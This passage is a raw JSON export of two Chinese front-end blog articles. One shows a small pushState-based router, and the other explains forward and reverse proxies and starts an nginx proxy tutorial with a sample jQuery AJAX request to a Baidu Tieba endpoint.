class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003echarset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"width=device-width, initial-scale=1.0\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"X-UA-Compatible\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ie=edge\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003eDocument\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003enav\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"navbar navbar-default nav-static-top\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container-fluid\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- Brand and toggle get grouped for better mobile display --\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"navbar-header\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"navbar-brand\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"#\"\u003c/span\u003e\u0026gt;\u003c/span\u003eLOGO\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n      \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- Collect the nav links, forms, and other content for toggling --\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"collapse navbar-collapse\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"bs-example-navbar-collapse-1\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"nav navbar-nav\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/1\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-role\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"custom-history\"\u003c/span\u003e\u0026gt;\u003c/span\u003e地址1 \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"sr-only\"\u003c/span\u003e\u0026gt;\u003c/span\u003e(current)\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/2\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edata-role\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"custom-history\"\u003c/span\u003e\u0026gt;\u003c/span\u003e地址2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ea\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- /.navbar-collapse --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- /.container-fluid --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003enav\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"panel panel-default\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"panel-heading\"\u003c/span\u003e\u0026gt;\u003c/span\u003ePanel heading without title\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"panel-body\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        Panel content\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"./route.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"./index.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eindex.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e $routeController = $(\u003cspan class=\"hljs-string\"\u003e'a[data-role=custom-history]'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Route()\n\napp.set(\u003cspan class=\"hljs-string\"\u003e'/1'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  $(\u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e).html(\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e)\n})\n\napp.set(\u003cspan class=\"hljs-string\"\u003e'/2'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  $(\u003cspan class=\"hljs-string\"\u003e'#app'\u003c/span\u003e).html(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eroute.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eRoute\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e () {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.urls = []\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handles = {}\n    \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'popstate'\u003c/span\u003e, (e) =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e state = e.state || {}\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e url = state.url || \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (url) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.refresh(url)\n      }\n    })\n\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e $routeController = $(\u003cspan class=\"hljs-string\"\u003e'a[data-role=custom-history]'\u003c/span\u003e)\n\n    $routeController.on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, e =\u0026gt; {\n      e.preventDefault()\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e link = $(e.target).attr(\u003cspan class=\"hljs-string\"\u003e'href'\u003c/span\u003e)\n      history.pushState({ \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: link }, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, link)\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.refresh(link)\n    })\n  }\n\n  set (route, handle) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.urls.indexOf(route) === \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.urls.push(route)\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handles[route] = handle\n    }\n  }\n\n  refresh (route) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.urls.indexOf(route) === \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eError\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'请不要这样调用, 路由表中不存在!'\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.handles[route]()\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e按我的本意是不想在一篇文章里贴这么多代码的, 但是因为也不可以直接嵌入jsbin之类的, 方便大家试试看效果, 就放进来把, 因为代码比较简单, 而且深度绑定到了dom上, 就不要嘲笑啦!\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6d511e1b65db?w=897\u0026amp;h=626\u0026amp;f=png\u0026amp;s=177013\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514893406.0108","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3f"},"id":"5a39da9af265da4327185dc9","author":{"$oid":"5a4b76d92239bd131cd79f33"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JS维护nginx反向代理，妈妈再也不用担心我跨域了！","meta":{"likeCount":0},"tag":["Node.js","JavaScript","前端","Nginx"],"comment":[],"shortContent":"“问你自己啊，我们后台不配合解决的。” ...... ...... 1. 什么是正向/反向代理 2. 什么是跨域 我要拿C的数据，但请求不到C（例如谷歌），不过我知道B是能请求到C的，于是我去告诉B，B帮我拿回了C的数据，有点翻墙的意思。敲黑板，划重点（C只知道B是他的小伙伴，…","content":"\u003ch2 class=\"heading\"\u003e一些废话（直接看代码的可跳过）\u003c/h2\u003e\n\u003cp\u003e“跨域了，咋搞啊！”\u003c/p\u003e\n\u003cp\u003e“问你自己啊，我们后台不配合解决的。”\u003c/p\u003e\n\u003cp\u003e“你们写几句话就好了啊，cors、jsonp、header ......”\u003c/p\u003e\n\u003cp\u003e“搞不来！不合法！不安全！......”\u003c/p\u003e\n\u003cp\u003e“卧槽，这接口又跨域了，我CNMLGB”\u003c/p\u003e\n\u003cp\u003e“你TM不会自己url-get、form-post、写nginx代理啊！”\n......\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e几个月后\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e“这接口跨域了！”\u003c/p\u003e\n\u003cp\u003e“写反向代理啊，上次你不是弄过吗？”\u003c/p\u003e\n\u003cp\u003e“我TM早忘了......”\u003c/p\u003e\n\u003cp\u003e如果你无论如何都得仍受并面对这样的后台小伙伴的话，那这篇文章来解救你了，让你的nginx配置信息管理的又简单，又清晰，而且fork一下github随时都不会忘了呢~\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e面向读者\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e无论如何都si不配合跨域的后台儿子们\u003c/li\u003e\n\u003cli\u003e总忘记咋配置nginx代理的前端爸爸们\u003c/li\u003e\n\u003cli\u003e老想跨域干些heiheihei的爬虫绅士们\u003c/li\u003e\n\u003cli\u003e想解决或想了解跨域问题的萌新们\n......\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e想要达到的目的\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e只用\u003cstrong\u003e一句命令行\u003c/strong\u003e来执行配置文件的\u003cstrong\u003e创建、修改\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003eJS配置\u003cstrong\u003e简单明了\u003c/strong\u003e，不会JS的小伙伴懂json格式就能\u003cstrong\u003e轻易维护\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"配置内容\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6d3c5211?w=728\u0026amp;h=390\u0026amp;f=png\u0026amp;s=33211\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e对于水平稍高的朋友们可对代码进行\u003cstrong\u003e二次开发\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e跨域不再困难\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e需要的工具\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003enode\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ecmd（命令指示符）\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003eTips\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003e以下内容会以初学者的角度进行并言简意赅的方式急速说明，掌握者可以跳着看\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e在开始之前您可能需要初步了解这些东西\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e1. 什么是正向/反向代理\u003c/strong\u003e\u003c/h4\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e2. 什么是跨域\u003c/strong\u003e\u003c/h4\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e1）什么是正向/反向代理\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e正向代理：\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e我要拿C的数据，但请求不到C（例如谷歌），不过我知道B是能请求到C的，于是我去告诉B，B帮我拿回了C的数据，有点翻墙的意思。敲黑板，划重点（\u003cstrong\u003eC只知道B是他的小伙伴，并不知道A是谁\u003c/strong\u003e）\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e反向代理：\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e我又要去拿C的数据了，不过这次运气好，C我能直接访问到（比如百度），那很棒哦，我自己搭建了个服务器B，B帮我拿回了C的数据。敲黑板，划重点（\u003cstrong\u003eC并不知道B是他的小伙伴，因为AB是一伙的\u003c/strong\u003e）\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e2）什么是跨域\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003e请求非自身(地址||端口)都算跨域\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e写一个非自身地址的AJAX的请求（起步）\u003c/h2\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤一：找接口\u003c/h3\u003e\n\u003cp\u003e首先咋们开始在网站上找各种接口，那我这边找了一个百度贴吧的post接口\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e请求头\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"贴吧post请求图 --- 请求头\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde68ed9b6b?w=1383\u0026amp;h=812\u0026amp;f=png\u0026amp;s=186906\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e请求值\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"贴吧post请求图 --- 请求值\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6305f8f6?w=561\u0026amp;h=300\u0026amp;f=png\u0026amp;s=35027\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e\u003cstrong\u003e返回值\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"贴吧post请求图 --- 返回值\" src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde71e6c7bb?w=742\u0026amp;h=452\u0026amp;f=png\u0026amp;s=51388\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e步骤二：创建index.html发起AJAX请求\u003c/h3\u003e\n\u003cp\u003e打开你善用的编辑器直接复制以下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u0026lt;!DOCTYPE\u0026gt;\n\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003echarset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"https://code.jquery.com/jquery-3.0.0.min.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n    $.ajax({\n      \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://tieba.baidu.com/connectmanager/user/updateFlashInfo\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003edata\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'{\"appid\":\"tieba\",\"cuid\":\"73118464C47E43476FB3E50ACD8E32C9:FG:1\",\"connection_id\":\"\",\"lcs_ip\":\"10.46.235.62\",\"lcs_port\":\"8891\",\"lcs_fd\":\"10619\",\"device_type\":\"21\"}'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003easync\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003esuccess\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.write(\u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(res))\n      }\n    })\n  \u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e跑服务试试？（这里是从8020端口开启的服务器）\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"ajax请求\" 